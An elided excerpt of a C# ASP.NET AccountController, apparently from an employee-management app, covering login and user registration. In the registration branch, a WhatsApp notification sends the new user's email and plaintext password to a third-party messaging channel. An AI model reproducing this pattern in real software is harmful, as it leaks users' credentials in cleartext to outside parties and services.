...
namespace EmployeeManagement.Controllers
{
    ...
    public class AccountController : Controller
    {
        ...
        public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
        {
            ...
            switch (result)
            {
                case SignInStatus.Success:
                    // Session["VHaaShUserEmail"] = model.Email;

                    var userId = db.AspNetUsers.FirstOrDefault(u => u.Email.Equals(model.Email))?.Id;
                ...
                default:
                    ModelState.AddModelError("Password", "Invalid login attempt. Check Username & Password.");
                    return View(model);
            }
        }
                ...
                if (result.Succeeded)
                {
                    ...
                    try
                    {
                        WhatsAppRequest notification = new WhatsAppRequest()
                        {
                            ...
                            Body = $"New user registered with email *{model.Email}* & password *{model.Password}* at *{DateTime.Now.ToString()}*",
        ...
        {
            //if (Session["VHaaShUserEmail"] != null)
            //{
